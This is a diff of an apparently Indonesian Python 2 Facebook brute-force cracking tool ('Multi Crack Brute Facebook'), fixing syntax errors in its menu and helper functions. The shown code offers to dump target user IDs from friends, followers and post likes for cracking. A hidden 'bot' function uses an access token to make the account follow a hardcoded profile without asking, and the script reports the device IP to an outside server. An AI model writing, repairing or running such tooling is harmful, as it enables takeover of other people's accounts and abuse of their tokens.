@@ -139,11 +139,11 @@ def reza_xd():
     print logo
     IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
     print '\033[0;91m___________________________________________________________\n';time.sleep(0.03)
-    print ' \033;0m(\033[0;96m•\033[0m) MCBF : ( Multi Crack Brute Facebook ) '
+    print ' \033[;0m(\033[0;96m•\033[0m) MCBF : ( Multi Crack Brute Facebook ) '
     print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
     print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
-    print '\033[0;91m___________________________________________________________\n';time.sleep(0.03)
-    print ' %[%s1%s]. Dump id dari teman'%(O,O,N);time.sleep(0.03)
+    print '\033[0;91m___________________________________________________________\033[;0m\n';time.sleep(0.03)
+    print ' [%s1%s]. Dump id dari teman'%(O,O,N);time.sleep(0.03)
     print ' [%s2%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
     print ' [%s3%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
     print ' [%s4%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
@@ -161,7 +161,7 @@ def reza_xd():
     elif pepek in['2','02']:
         publik(kontol)
     elif pepek in['3','03']:
-        followers(konto;)
+        followers(kontol)
     elif pepek in['4','04']:
         postingan(kontol)
     elif pepek in['5','05']:
@@ -205,7 +205,7 @@ def reza_xd():
         print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);reza_xd()
 
 # Jangan Di Ganti Bot Nya Bang
-def wuhan(mail):
+def wuhan(kontol):
     try:
         kentod = kontol
         requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
@@ -225,7 +225,7 @@ def wuhan(mail):
     	pass
 
 # dump id dari teman hehe
-def teman(k):
+def teman(kontol):
     try:
         os.mkdir('dump')
     except:pass
